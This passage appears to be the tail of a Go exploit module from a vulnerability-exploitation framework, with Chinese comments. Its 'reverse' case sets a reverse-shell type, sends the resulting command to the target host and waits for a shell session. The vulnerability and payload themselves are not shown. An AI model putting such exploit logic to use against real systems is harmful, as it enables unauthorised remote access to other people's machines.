				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			case "reverse":
				//配置反弹shell的类型
				reversetype := goutils.B2S(ss.Params["reverse"])

				if command, waitSessionCh, err := setReverseRequest(reversetype); command != "" {
					go runPayload(expResult.HostInfo, command)
					setReverseWaitting(expResult, waitSessionCh)
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			default:
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
